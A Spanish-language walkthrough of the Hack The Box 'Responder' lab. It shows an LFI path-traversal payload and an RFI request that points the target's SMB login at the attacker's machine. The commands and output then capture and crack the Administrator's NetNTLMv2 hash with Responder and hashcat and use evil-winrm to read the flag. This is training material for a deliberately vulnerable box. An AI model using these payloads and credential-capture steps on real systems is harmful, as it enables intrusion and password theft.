---
title: Responder
date: 2025-04-5 00:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, responder]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0348ed41851064f497d155c2a6af359a.png
    alt: Hack The Box
---
## Responder
El reto comienza sugiriendo visitar la web en la IP proporcionada. 

## Task 1

When visiting the web service using the IP address, what is the domain that we are being redirected to?
> unika.htb

## Task 2

Which scripting language is being used on the server to generate webpages?
> php

## Task 3

Antes de continuar con el ejercicio habrás notado que al ingresar a la IP que nos proporcionan con el navegador 
es redireccionada inmediatamente a un dominio con una página en blanco. Para resolverlo podemos editar
/etc/host, esto forzará a resolver  unika.htb contra la IP proporcionada

```
  GNU nano 8.3                           /etc/hosts                                    
127.0.0.1       localhost
127.0.1.1       kali25

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.204.40 unika.htb

```

What is the name of the URL parameter which is used to load different language versions of the webpage?
Despúes de la acción anterior podremos cargar la página con normalidad. Ponemos atención a la selección de lenguage en la propia página 
__http://unika.htb/index.php?page=german.html__ el parámetro es page
> page

## Task 4

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

Podemos probarlo http://unika.htb/index.php?page=%22../../../../../../../../windows/system32/drivers/etc/hosts :
```
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
```
> ../../../../../../../../windows/system32/drivers/etc/hosts
## Task 5

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

Ahora lo que tenemos que hacer es utilizar **Responder** para capturar las credenciales del usuario en Windows NTLM2.
Responder es una utilidad que le dice a los clientes Windows que envíen sus datos para ser verificados
``` shell
sudo responder -I tun0
```

Ahora vamos al navegador y forzamos la entrega en el parámetro page irá la IP actual de nuestra máquina.
http://unika.htb/?page=//10.10.15.134/test

``` shell
+] Listening for events...                                                            

[SMB] NTLMv2-SSP Client   : 10.129.204.40
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:d60013764c600ada:6B41C8A99EEDB086830B71FDC1189EFB:0101000000000000007C0ABD1EA7DB0158FB12DC40C221CD00000000020008003100560036004F0001001E00570049004E002D004400480039004C0044004C004800590054005700340004003400570049004E002D004400480039004C0044004C00480059005400570034002E003100560036004F002E004C004F00430041004C00030014003100560036004F002E004C004F00430041004C00050014003100560036004F002E004C004F00430041004C0007000800007C0ABD1EA7DB0106000400020000000800300030000000000000000100000000200000FA057EE92AEBD3579B665880A2BA6410D4E6CE016DB45D7983AD98C0B25A47EB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100330034000000000000000000                                              
```
>//10.10.14.6/somefile

## Task 6

What does NTLM stand for?
> New Technology LAN Manager 

## Task 7

Which flag do we use in the Responder utility to specify the network interface?
>-I

## Task 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
> john the ripper

## Task 9

What is the password for the administrator user?

El ejercicio sugiere utilizar john the ripper pero a mi me gusta hashcat, una cosa en el pentesting es que se pueden usar distintos métodos y
herramientas para obtener los mismos resultados. 

``` shell
┌──(kali㉿kali25)-[~]
└─$ hashcat "Administrator::RESPONDER:d60013764c600ada:6B41C8A99EEDB086830B71FDC1189EFB:0101000000000000007C0ABD1EA7DB0158FB12DC40C221CD00000000020008003100560036004F0001001E00570049004E002D004400480039004C0044004C004800590054005700340004003400570049004E002D004400480039004C0044004C00480059005400570034002E003100560036004F002E004C004F00430041004C00030014003100560036004F002E004C004F00430041004C00050014003100560036004F002E004C004F00430041004C0007000800007C0ABD1EA7DB0106000400020000000800300030000000000000000100000000200000FA057EE92AEBD3579B665880A2BA6410D4E6CE016DB45D7983AD98C0B25A47EB0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100330034000000000000000000" --wordlist /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-bdver1-AMD FX(tm)-4300 Quad-Core Processor, 1438/2941 MB (512 MB allocatable), 2MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

ADMINISTRATOR::RESPONDER:d60013764c600ada:6b41c8a99eedb086830b71fdc1189efb:0101000000000000007c0abd1ea7db0158fb12dc40c221cd00000000020008003100560036004f0001001e00570049004e002d004400480039004c0044004c004800590054005700340004003400570049004e002d004400480039004c0044004c00480059005400570034002e003100560036004f002e004c004f00430041004c00030014003100560036004f002e004c004f00430041004c00050014003100560036004f002e004c004f00430041004c0007000800007c0abd1ea7db0106000400020000000800300030000000000000000100000000200000fa057ee92aebd3579b665880a2ba6410d4e6ce016db45d7983ad98c0b25a47eb0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100330034000000000000000000:badminton
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::RESPONDER:d60013764c600ada:6b41c8a99...000000
Time.Started.....: Sun Apr  6 18:54:16 2025 (0 secs)
Time.Estimated...: Sun Apr  6 18:54:16 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    29723 H/s (1.17ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3584/14344385 (0.02%)
Rejected.........: 0/3584 (0.00%)
Restore.Point....: 3072/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adriano -> fresa

Started: Sun Apr  6 18:54:11 2025
Stopped: Sun Apr  6 18:54:18 2025
```
> badminton

## Task 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

``` shell
nmap  -p 1000-65000 -T 1  --open -vv 10.129.204.40
PORT     STATE SERVICE
5985/tcp open  wsman
```
> 5985

## Submit Flag

Para sacar la flag nos valdremos de  Evil-WinMR que es un programa que permite controlar servidores de Windows a través de un protocolo basado en SOAP [hacktools#exploiting](../hacktools#exploiting). Una vez accedemos al servidor navegamos por los directorios hasta 
encontrarnos con el usuario **mike**
```
┌──(kali㉿kali25)-[~]
└─$ evil-winrm -i 10.129.204.40 -u administrator -p badminton
*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac
*Evil-WinRM* PS C:\Users\mike\Desktop> 

```

## Submit root flag [achivement](https://www.hackthebox.com/achievement/machine/2336390/461)